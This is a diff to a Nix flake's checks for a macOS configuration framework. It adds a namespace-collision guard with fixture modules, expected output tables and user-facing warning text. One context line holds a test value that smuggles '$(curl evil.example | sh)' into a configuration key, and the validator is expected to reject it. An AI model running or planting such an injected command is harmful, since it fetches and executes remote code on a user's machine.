@@ -339,6 +339,11 @@
               # refusal of a second one, which a consumer can reach from here too by
               # passing `lib.desktop` through their own module list.
               ./modules/desktop
+              # And the namespace seam, for the same reason: a partial import is
+              # still a machine, and the private room it collides with is the
+              # consumer's, not haus's. It stays silent here by construction —
+              # every namespace a partial declares is one of haus's own.
+              ./modules/namespaces.nix
               ./modules/workspaces
               ./modules/roster
               # The AI room's wiring. In the foundation rather than a room of its own
@@ -884,6 +889,107 @@
             ++ nixpkgs.lib.optionals (collectionOrphans == [ ]) (
               builtins.concatMap collectionCompose collectionNames
             );
+
+          # ---- namespace-guard -------------------------------------------------
+          # The consumer-side half of the reserved prefix (step E0 of the
+          # workshop's rooms-desktops plan). What it guards is a collision haus
+          # cannot see from here: a person's own `options.haus.<name>` against a
+          # name a FUTURE haus release takes. `modules/lib/namespaces.nix` has
+          # the measurement and the reasoning; this pins the behaviour, including
+          # the two ways it has already been got wrong.
+          #
+          # It is pure lib, like `room-registry` and `data-only-surface`, so it
+          # runs on the Linux runner rather than on nobody's CI.
+          namespaceGuard = import ./modules/lib/namespaces.nix {
+            lib = nixpkgs.lib;
+            inherit registry;
+          };
+          nsOptionsOf =
+            mods:
+            (nixpkgs.lib.evalModules {
+              specialArgs.lib = nixpkgs.lib;
+              modules = import ./modules/options-modules.nix ++ mods;
+            }).options.haus;
+          # A room someone wrote for themselves, in the shape /rooms/creating
+          # teaches. Two leaves and no `enable`-only shortcut, because naming the
+          # file has to work for the 26 of haus's 35 namespaces that have no
+          # `enable` leaf either.
+          nsPrivateRoom = {
+            _file = "/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix";
+            options.haus.photography = {
+              enable = nixpkgs.lib.mkOption {
+                type = nixpkgs.lib.types.bool;
+                default = false;
+                description = "A room someone wrote for their own Mac.";
+              };
+              catalog = nixpkgs.lib.mkOption {
+                type = nixpkgs.lib.types.str;
+                default = "~/Pictures";
+                description = "Where the photos live.";
+              };
+            };
+          };
+          # The same room, moved to where this whole step is telling people to
+          # put it. Must come back silent.
+          nsReservedRoom = {
+            _file = "/nix/store/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-source/photography.nix";
+            options.haus.my.photography.enable = nixpkgs.lib.mkOption {
+              type = nixpkgs.lib.types.bool;
+              default = false;
+              description = "The same room, under the reserved prefix.";
+            };
+          };
+          nsShow = xs: if xs == [ ] then "-" else builtins.concatStringsSep "," xs;
+          nsRow =
+            name: mods:
+            let
+              opts = nsOptionsOf mods;
+              rows = namespaceGuard.unregistered opts;
+            in
+            "${name} candidates=${nsShow (namespaceGuard.candidates opts)} "
+            + "unregistered=${nsShow (map (u: u.namespace) rows)} "
+            + "declared-by=${nsShow (builtins.concatMap (u: u.declaredBy) rows)}";
+          # `my` is a promise, so it is a check: haus may never ship a room under
+          # it, and the day someone adds one this row is what says so.
+          nsPromiseRow =
+            let
+              taken = builtins.elem namespaceGuard.reserved registeredNamespaces;
+              declared = builtins.elem namespaceGuard.reserved actualNamespaces;
+              yn = b: if b then "yes" else "no";
+            in
+            "promise reserved=${namespaceGuard.reserved} in-registry=${yn taken} declared-by-haus=${yn declared}";
+          namespaceGuardTable = builtins.concatStringsSep "\n" [
+            (nsRow "stock" [ ])
+            (nsRow "private" [ nsPrivateRoom ])
+            (nsRow "reserved" [ nsReservedRoom ])
+            (nsRow "both" [
+              nsPrivateRoom
+              nsReservedRoom
+            ])
+            nsPromiseRow
+          ];
+          # `stock candidates=claude` is the row worth reading twice. The cheap
+          # pre-filter DOES let the rename shim through (modules/moved.nix leaves
+          # a hidden `haus.claude` behind) and the real derivation then clears
+          # it — which is the whole reason the check is two steps rather than the
+          # three-words-shorter one. If `unregistered` ever reads `claude` on the
+          # stock row, the shorthand has come back and every haus machine is
+          # being accused of installing something it didn't.
+          expectedNamespaceGuardTable = ''
+            stock candidates=claude unregistered=- declared-by=-
+            private candidates=claude,photography unregistered=photography declared-by=/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix
+            reserved candidates=claude unregistered=- declared-by=-
+            both candidates=claude,photography unregistered=photography declared-by=/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix
+            promise reserved=my in-registry=no declared-by-haus=no
+          '';
+          # The words a person actually meets, pinned like the ai room's pill
+          # warnings: this text is the entire user-facing surface of E0.
+          namespaceGuardWarnings = namespaceGuard.warningsFor (nsOptionsOf [ nsPrivateRoom ]);
+          expectedNamespaceGuardWarnings = ''
+            haus: `haus.photography` is not a room haus ships, and nothing here records who it belongs to.
+              declared by /nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix
+            Yours alone? Move it under `haus.my.` — `haus.my.photography` — which haus promises never to ship a room under. Somebody else's published room? Then a plain name is correct, and what is missing is this machine's record of the claim, which haus cannot write yet. Either way the risk is the same: a haus release that takes this name meets the declaration above, and the likely outcome is not an error — two modules declaring different leaves under one namespace merge in silence, one room's switch steering the other's.
+          '';
 
           # ---- fragment-compat -------------------------------------------------
           # Step 5 of the rooms plan moved two top-level fragments into the rooms
@@ -2345,6 +2451,7 @@
             test/desktops/nixpkgs.nix: may not set `nixpkgs.*`
             test/desktops/non-attrset.nix: does not evaluate to a set of settings — a desktop is { haus = { … }; }
             test/desktops/priority-instruction.nix: haus.ui.scale may not carry a merge or priority instruction — a desktop states values, and the host is what outranks them
+            test/desktops/reserved-prefix.nix: haus.my names a private room, and a desktop is a file other people run. `haus.my.*` is reserved for rooms that live on one Mac and nowhere else, so nothing shared may name one — publish the room and it claims a plain `haus.<name>` like any other.
             test/desktops/scene-name.nix: haus.focus.scenes.deep work is not a plain scene name
             test/desktops/shell-in-free-key.nix: haus.bar.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks, newlines or tabs
             test/desktops/stray-key.nix: sets `launchd` outside `haus`, and a desktop may set nothing else
@@ -2403,6 +2510,7 @@
             nixpkgs.nix class=desktop ok=false sets=1 rooms=haus silent=12
             non-attrset.nix class=desktop ok=false sets=0 rooms=- silent=12
             priority-instruction.nix class=desktop ok=false sets=1 rooms=haus silent=12
+            reserved-prefix.nix class=desktop ok=false sets=1 rooms=- silent=12
             scene-name.nix class=desktop ok=false sets=1 rooms=focus silent=11
             shell-in-free-key.nix class=desktop ok=false sets=1 rooms=bar silent=11
             stray-key.nix class=desktop ok=false sets=1 rooms=haus silent=12
@@ -2848,6 +2956,14 @@
 
             diff -u ${pkgs.writeText "expected" expectedDesktopShowSample} \
                     ${pkgs.writeText "actual" (desktopShowSample + "\n")}
+            touch $out
+          '';
+          namespace-guard = pkgs.runCommand "haus-namespace-guard-ok" { } ''
+            diff -u ${pkgs.writeText "expected" expectedNamespaceGuardTable} \
+                    ${pkgs.writeText "actual" (namespaceGuardTable + "\n")}
+
+            diff -u ${pkgs.writeText "expected" expectedNamespaceGuardWarnings} \
+                    ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" namespaceGuardWarnings + "\n")}
             touch $out
           '';
         }
